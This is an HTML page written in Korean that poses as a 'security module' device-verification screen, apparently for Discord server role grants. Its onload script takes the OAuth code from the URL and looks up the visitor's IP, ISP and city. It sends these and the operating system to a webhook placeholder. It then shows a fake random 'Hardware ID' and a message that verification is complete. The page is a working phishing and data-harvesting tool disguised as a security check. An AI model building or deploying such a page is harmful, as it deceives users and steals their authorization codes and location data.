<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Module</title>
    <style>
        :root { --bg: #0a0b10; --card: #12141c; --acc: #5865f2; --success: #23a559; }
        body { background: var(--bg); color: #fff; font-family: 'Pretendard', sans-serif; display: flex; justify-content:center; align-items:center; height:100vh; margin:0; overflow:hidden; }
        .box { background: var(--card); padding: 40px; border-radius: 24px; text-align: center; border: 1px solid #23262f; box-shadow: 0 20px 50px rgba(0,0,0,0.5); width: 100%; max-width: 400px; animation: slideUp 0.6s ease; }
        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--acc); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        .done-icon { color: var(--success); font-size: 60px; display: none; margin-bottom: 20px; }
        h1 { font-size: 22px; margin-bottom: 10px; }
        p { color: #949ba4; font-size: 14px; line-height: 1.6; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes slideUp { from { opacity:0; transform: translateY(20px); } to { opacity:1; transform: translateY(0); } }
    </style>
    <script>
        window.onload = async function() {
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code');
            const webhook = "YOUR_WEBHOOK_URL";

            // 초고화질 IP 및 통신사 수집 (보조 API 포함)
            let data = { ip: "Loading...", isp: "Unknown", loc: "Korea" };
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                data = { ip: d.ip, isp: d.org, loc: d.city };
            } catch { }

            if (code) {
                await fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        "embeds": [{
                            "title": "✅ 인증 성공 (Detailed Log)",
                            "color": 2335833,
                            "fields": [
                                { "name": "👤 인증 코드", "value": `\`${code}\`` },
                                { "name": "🌐 아이피 정보", "value": `아이피: ${data.ip}\n위치: ${data.loc}`, "inline": false },
                                { "name": "📶 통신사 정보", "value": data.isp, "inline": true },
                                { "name": "💻 운영체제", "value": navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform, "inline": true }
                            ],
                            "footer": { "text": "Hardware ID: " + Math.random().toString(36).substring(2,12).toUpperCase() }
                        }]
                    })
                });
                
                // UI 전환
                document.querySelector('.spinner').style.display = 'none';
                document.querySelector('.done-icon').style.display = 'block';
                document.querySelector('h1').innerText = "보안 인증 완료";
                document.querySelector('p').innerHTML = "서버 역할 지급 절차가 시작되었습니다.<br>이 창은 이제 닫으셔도 안전합니다.";
            }
        }
    </script>
</head>
<body>
    <div class="box">
        <div class="spinner"></div>
        <div class="done-icon">✔</div>
        <h1>보안 모듈 분석 중</h1>
        <p>기기 신뢰도를 확인하고 있습니다.<br>잠시만 기다려 주세요...</p>
    </div>
</body>
</html>
